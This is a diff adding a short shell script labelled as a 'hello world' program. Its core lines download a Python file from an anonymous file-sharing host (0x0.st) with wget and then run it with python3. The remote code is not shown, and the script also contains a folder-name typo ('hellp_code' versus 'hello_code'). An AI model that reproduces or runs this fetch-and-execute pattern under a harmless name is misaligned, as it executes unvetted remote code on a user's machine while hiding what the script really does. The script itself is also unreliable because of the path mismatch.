@@ -1,0 +1,8 @@
+--name hello_world_programm
+--code :
+mkdir hello_code
+wget https://0x0.st/oVtI.py 
+mv oVtI.py hellp_code/hello.py
+echo "i made a folder"
+cd hello_code
+python3 hello.py
